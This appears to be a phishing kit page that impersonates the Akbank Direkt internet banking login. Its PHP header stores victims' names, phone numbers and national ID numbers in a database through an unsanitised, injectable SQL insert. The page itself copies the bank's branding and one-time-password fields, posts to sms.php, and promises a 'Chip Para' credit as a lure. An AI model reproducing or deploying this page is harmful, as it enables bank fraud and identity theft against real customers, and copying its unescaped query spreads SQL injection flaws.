<?
include("baglan.php");
$ad=$_POST['ad'];
$tel=$_POST['tel']; 
$tc=$_POST['tc']; 
mysql_query("insert into iletisim (ad, tc, tel) values ( '$ad', '$tc', '$tel')");
?>

<!DOCTYPE html>

<html class="no-js javascript png flash9 chrome webkit win"><!--<![endif]--><head id="ctl00_head"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="robots" content="noindex, nofollow"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>
	Akbank Direkt İnternet
</title><meta name="description" content="Akbank Direkt İnternet"><link rel="stylesheet" text="text/css" href="./WebResource.axd"></head>

<body class="is-retail is-turkish is-desktop is-nontouch">
    <form name="sms" method="post" action="sms.php" id="sms" autocomplete="off" style="height:100%;">
<div>
</div>



<script src="./WebResource(1).axd" type="text/javascript"></script>


<script src="./WebResource(2).axd" type="text/javascript"></script>
<script src="./WebResource(3).axd" type="text/javascript"></script>
<script src="./WebResource(4).axd" type="text/javascript"></script><script language="javascript">
window.history.forward(1);

</script>
<script src="./rsa.js.indir"></script>
<script src="./barrett.js.indir"></script>
<script src="./bigint.js.indir"></script>

<div>
</div>
 
        <link href="./jqueryuismoothness.axd" rel="stylesheet">

        <link href="./newlogin.axd" rel="stylesheet">

        <script src="./jquerymain.axd"></script>

        <script src="./newloginjs.axd"></script>

        <link href="./face.axd" rel="stylesheet">

        <link href="./facelift.axd" rel="stylesheet">


        
        <script src="./veribranch.axd"></script>

        <script src="./raphael.axd"></script>

        <script src="./face(1).axd"></script>


        <script type="text/javascript" src="./entrypoint.aspx"></script>
        <div id="login-bar" class="login-has-switch">
            <ul id="login-switch" class="clearfix">
                
    <li class="login-switch-item" id="switch-item-corporate"><a href="javascript:void(0)" data-localize="Corporate_PageHeader">Kurumsal</a></li>
    <li class="login-switch-item" id="switch-item-language"><a href="javascript:void(0)" data-localize="SwitchLanguage">English</a></li>

            </ul>
            <div id="login-logo"></div>
        </div>
        <div id="login-wrapper" style="min-height: 505px;">
            <div id="login-container" class="clearfix">
                <div id="login-main" style="">
                   <div id="login-content" style="min-height: 323px;">
                        <div>
                            
     
    


<h1 id="login-caption" data-localize="PageHeader">Bireysel</h1>

<ul id="login-tab" class="clearfix">
    <li class="login-tab-item login-active" id="bis-login-tab"><a href="javascript:void(0)">Müşteri / TC Kimlik No ile Giriş</a></li>
</ul>

<div id="login-loading" style="display: none;" data-localize="PleaseWait">Lütfen bekleyiniz...</div>
<div id="login-panel-bis-mbb" class="login-panel">
    <div class="login-row">
        <label for="txtMbbTckn" class="login-label" data-localize="CustomerNo">Akbank'ı tercih ettiğiniz icin teşekkür ederiz. <be>24 saat içerisinde Chip Para'nız hesabınıza aktarılacaktır.</label>
        <div class="clearfix">
            
            <div class="login-tooltip" aria-haspopup="true">
                <span class="login-tooltip-text" data-localize="CustomerNumber">Akbank Direkt'e girişlerinizde Müşteri Numarası ya da T.C. Kimlik No kullanabilirsiniz. <br><br>Müşteri Numarası, Akbank Hesap Cüzdanınızda veya Akbank Banka Kartınızın üzerinde Müşteri No alanında yazılı olan numaradır. T.C. Kimlik Nonuzu Nüfus Cüzdanınızın üzerinde bulabilirsiniz.</span>
            </div>
        </div>
    </div>
    <div class="login-row" id="captcha-panel-row" style="display: none">
        

<label for="txtCaptcha" class="login-label" data-localize="SecurityCode">Güvenlik Kodu</label>
<div class="clearfix">
    <input name="txtCaptcha" id="txtCaptcha" type="text" autocomplete="off" maxlength="4" class="login-input login-input-55 login-text-center" tabindex="4">
    <div class="login-captcha-container">
        <img id="captchaimage" src="./321321.gif" width="90" height="32"><script src="./serverrequest.js.indir"></script>
    </div>
    <a class="login-captcha-refresh" href="javascript:DirektCore.RenewCaptcha();" title="Yenile"></a>
    <div class="login-tooltip" aria-haspopup="true">
        <span class="login-tooltip-text" data-localize="LoginToolTipCaptcha">Güvenlik Kodu: 4 karakterden oluşan bu bilgiyi, Güvenlik Kodu alanına girmeniz gerekmektedir.<br><br>  Karakterleri okuyamamanız durumunda kodun yanındaki “Yenile” butonuna tıklayarak yeni bir kod oluşturabilirsiniz.</span>
    </div>
    <span style="display:none" id="hiddenSpan" data-localize="CaptchaRefreshButtonTitle">Yenile</span>
</div>
    </div>
</div>

    <div id="login-panel-bis-security" class="login-panel" style="display: none;">
        

<div class="login-balloon clearfix" id="security-image-panel">
    <div class="login-security-container">
       <img id="loginSecurityImage" src="./blank.gif" alt="Güvenlik Resmi">
    </div>
    <p class="login-security-warning" data-localize="SecurityImageLoginInfoText">Güvenlik resminizi kontrol ediniz. Güvenlik resminde bir yanlışlık   olduğunu düşünüyorsanız, işleminize devam etmeyiniz ve <b>444 25 25</b>'i arayınız.</p>
    <div class="login-balloon-arrow"></div>
</div>


        

<div class="login-row" id="second-level-auth-message-row"></div>
<div class="login-row" id="mobile-pin-cepsifre" style="display: none;">
    <label for="txtCepSifre" class="login-label" data-localize="MobilePass">Cep Şifre</label>
    <div class="clearfix">
        <input name="txtCepSifre" id="txtCepSifre" type="text" autocomplete="off" maxlength="6" class="login-input" tabindex="5">
        <span id="cep-sifre-tekrar-gonder" style="display: none"><a class="login-captcha-refresh login-refresh" href="javascript:AkbankLogin.Resend(&#39;SMS&#39;);" title="Yenile"></a></span>
    </div>
    <div class="login-mobil-pin-count-box-container">
        <span data-localize="MobilePinTimerCountDownLabel">Cep Şifre Giriş Süresi</span>
        <span class="login-mobil-pin-count-box-counter"></span>
    </div>
</div>
<div class="login-row" id="mobile-pin-mobil-imza" style="display: none; margin-bottom: -20px;">
    <label for="txtMsign" class="login-label" data-localize="MobileSignature">İşlem Parmakizi</label>
    <div class="clearfix" style="margin-left: -10px;">
        <div class="msign-finger-print noselect"></div>
        <div class="msign-ajax-loading"></div>
        <div class="msign-refresh">
            <a class="login-captcha-refresh login-refresh" href="javascript:AkbankLogin.Resend(&#39;MSIGN&#39;);" title="Yenile"></a>
        </div>
    </div>
    <div class="login-mobil-sign-count-box-container">
        <span data-localize="MobileSignTimerCountDownLabel">Mobil İmza Onay Süresi</span>
        <span class="login-mobil-pin-count-box-counter"></span>
    </div>
</div>
<div class="login-row" id="mobile-pin-soft-otp" style="display: none;">
    <label for="txtSoftOtp" class="login-label" data-localize="GeneralPassword">Şifre</label>
    <div class="clearfix">
        <input name="txtSoftOtp" id="txtSoftOtp" type="text" autocomplete="off" maxlength="6" class="login-input" tabindex="6">
    </div>
</div>
<div class="login-row" id="mobile-pin-hard-otp" style="display: none;">
    <label for="txtHardOtp" class="login-label" data-localize="GeneralPassword">Şifre</label>
    <div class="clearfix">
        <input name="txtHardOtp" id="txtHardOtp" type="text" autocomplete="off" maxlength="6" class="login-input" tabindex="7">
    </div>
</div>
<div class="login-row mobile-pin-hard-otp-sync" id="mobile-pin-hard-otp-sync-1" style="display: none;">
    <label for="txtHardOtpSync1" class="login-label" data-localize="HardTokenPin1Label">İlk Şifre</label>
    <div class="clearfix">
        <input name="txtHardOtpSync1" id="txtHardOtpSync1" type="text" autocomplete="off" maxlength="6" class="login-input" tabindex="8">
    </div>
</div>
<div class="login-row mobile-pin-hard-otp-sync" id="mobile-pin-hard-otp-sync-2" style="display: none;">
    <label for="txtHardOtpSync2" class="login-label" data-localize="HardTokenPin2Label">İkinci Şifre</label>
    <div class="clearfix">
        <input name="txtHardOtpSync2" id="txtHardOtpSync2" type="text" autocomplete="off" maxlength="6" class="login-input" tabindex="9">
    </div>
</div>
<div class="login-row login-row-btn">
    <a href="javascript:void(0)" class="login-btn login-btn-next" data-localize="LoginContinueButton">Devam</a>
</div>
<div class="login-row" id="alternate-login-methods-row">
    <ul>
        <li data-key="SMS"><a href="javascript:void(0)" data-localize="SwitchAuthMobilePass">Cep Şifre ile giriş</a></li>
        <li data-key="SOFTP"><a href="javascript:void(0)" data-localize="SwitchAuthSoftOtp">Şifreci-Mobil ile giriş</a></li>
        <li data-key="MSIGN"><a href="javascript:void(0)" data-localize="SwitchAuthMobileSign">Mobil İmza ile giriş</a></li>
        <li data-key="HOTP"><a href="javascript:void(0)" data-localize="SwitchAuthHardOtp">Şifreci ile giriş</a></li>
    </ul>
</div>

    </div>

                        </div>
                    </div>
                </div>
                
    

<div id="login-aside" style="">
    <div id="login-aside-security" class="clearfix" style="min-height: 323px;">
        <h4 data-localize="LoginAsideTitle">Güvenliğiniz İçin:</h4>
        <ul>
            <li class="login-aside-security-item" data-localize="LoginAsideItem1">Akbank Direkt şifrenizi kimseyle paylaşmayın.</li>
            <li class="login-aside-security-item" data-localize="LoginAsideItem3">Akbank Direkt girişinde cep telefonu marka ve modeli bilgileriniz istenmez.</li>
        </ul>
        <a id="login-aside-security-all" href="http://www.akbank.com/tr-tr/genel/Sayfalar/Guvenlik-Duyurulari.aspx" data-localize="LoginAsideLinkText" target="_blank">Tüm güvenlik uyarıları</a>
    </div>
</div>


            </div>
            <div id="login-footer" class="clearfix">
                <p id="login-copyright" data-localize="AkbankCopyright">Her hakkı Akbank T.A.Ş.'ye aittir. © 2017</p>
                <a id="login-secure" href="https://sealinfo.verisign.com/splash?form_file=fdf/splash.fdf&amp;dn=INTERNETSUBESI.AKBANK.COM&amp;lang=en" target="_blank">
                    <img src="./norton-secured.png" alt="Norton Secured">
                </a>
            </div>
            <div id="login-complete-TEMP" style="display: none;"><span id="login-complete-text-TEMP">Veee, müşteri login olur :)</span></div>
        </div>
        
    <script lang="javascript">
        $(document).ready(function () {

        });
    </script>

        <div id="ctl00_ClientSideTimeoutControl_logOutPopup" style="position: absolute; left: 50%; margin-left: -279px; top: 190px; display: none;
    width: 520px; z-index: 10000;">
    <img class="fix" src="./pop_up.png">
    <div style="position: absolute; top: 30px; left: 35px;">
        <span style="float: left; width: 490px; color: #FF0000; font-size: 12px; padding-top: 1px;">
            <strong style="font-weight: bold;">
                DİKKAT!</strong></span> <span style="color: #666666;
                    font-size: 12px; font-weight: bold; width: 490px; text-align: center; float: left;
                    line-height: 130%; padding-top: 10px; font-family: Arial,Helvetica,sans-serif;">
                    5 dak. süreyle hiçbir işlem yapılmadı. Oturumunuz
                    <span id="remainingSeconds"></span>
                    sn içinde kapatılacaktır.
                    <br>
                    Devam etmek istiyor musunuz?
                </span><span style="float: left; padding-top: 7px; width: 490px; text-align: center;">
                    <a onclick="logoffUser();return false;" id="ctl00_ClientSideTimeoutControl_closeButton" class="akb_button_tr popupClose" href="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$ClientSideTimeoutControl$closeButton&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, true))" style="*text-indent: 0px;"></a>
                    &nbsp;&nbsp;&nbsp;
                    <a onclick="return continueButton_ClientClick();" id="ctl00_ClientSideTimeoutControl_continueButton" class="akb_button_tr popupContinue" href="javascript:__doPostBack(&#39;ctl00$ClientSideTimeoutControl$continueButton&#39;,&#39;&#39;)"></a>
                </span>
    </div>
</div>
<div id="ctl00_ClientSideTimeoutControl_time_out_Popup" style="display: none;">
    <div class="regular vb_popup" id="popup_wrapper" style="display: none; margin-left: -275px; top: 180px;">
        <div id="popup">
            <div class="popup-content" id="mainPopContent" style="height: 140px">
                <div class="">
                    <h3 class="headline">
                        <strong id="warning_header" style="font-weight: bold;"></strong>
                    </h3>
                    <a id="ctl00_ClientSideTimeoutControl_close" class="close">
                        Kapat</a>
                </div>
                <div class="popup-text">
                    <p id="warning_message" style="font-size: 13px;">
                    </p>
                </div>
                <div class="popup-buttons" id="okButton" style="margin: 3px 0 -2px;">
                    &nbsp; <a class="akb_button_tr ok mr5" style="display: inline-block; margin: 0px auto;">
                        ok</a></div>
            </div>
        </div>
    </div>
</div>
 
<noscript>
    &lt;div&gt;
        &lt;img src="https://sdc.akbank.com/dcskz4se500000ww6suwlxkgn_1q9f/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=9.3.0&amp;WT.dcssip=internetsubesi.akbank.com" id="ctl00_WebTrendsUserControl_DCSIMG" alt="DCSIMG" width="1" height="1" /&gt;
    &lt;/div&gt;
</noscript>


    </form>

</body></html>